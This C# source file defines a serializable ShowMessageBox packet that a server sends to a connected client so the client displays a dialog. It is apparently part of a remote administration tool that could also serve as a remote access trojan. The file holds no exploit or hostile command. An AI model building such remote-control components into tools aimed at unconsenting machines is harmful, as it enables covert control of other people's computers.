using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class ShowMessageBox : IPacket
    {
        [ProtoMember(1)]
        public string Caption { get; set; }

        [ProtoMember(2)]
        public string Text { get; set; }

        [ProtoMember(3)]
        public string MessageboxButton { get; set; }

        [ProtoMember(4)]
        public string MessageboxIcon { get; set; }

        public ShowMessageBox()
        {
        }

        public ShowMessageBox(string caption, string text, string messageboxbutton, string messageboxicon)
        {
            this.Caption = caption;
            this.Text = text;
            this.MessageboxButton = messageboxbutton;
            this.MessageboxIcon = messageboxicon;
        }

        public void Execute(Client client)
        {
            client.Send<ShowMessageBox>(this);
        }
    }
}